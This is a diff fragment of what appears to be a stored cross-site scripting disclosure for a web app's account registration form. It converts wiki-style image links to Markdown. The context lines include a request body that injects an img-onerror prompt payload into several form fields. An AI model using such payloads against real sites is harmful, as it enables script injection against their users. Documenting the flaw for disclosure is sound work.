@@ -31,7 +31,7 @@ Click on New Account button on login page, then fill the fields. Inject < img sr
 
 		fname=%3Cimg+src%3Dx+onerror%3Dprompt%28%22xss%22%29%3E&lname=%3Cimg+src%3Dx+onerror%3Dprompt%28%22xss%22%29%3E&gender=Male&phone=5554443322&city=%3Cimg+src%3Dx+onerror%3Dprompt%28%22xss%22%29%3E&street=%3Cimg+src%3Dx+onerror%3Dprompt%28%22xss%22%29%3E&email=test1%40test.com&password=Test12345&submit=1
 
-![[XSS1.png]]
+![](XSS1.png)
 
-![[XSS2.png]]![[xss4.png]]
-![[xss3.png]]
+![](XSS2.png)![](xss4.png)
+![](xss3.png)
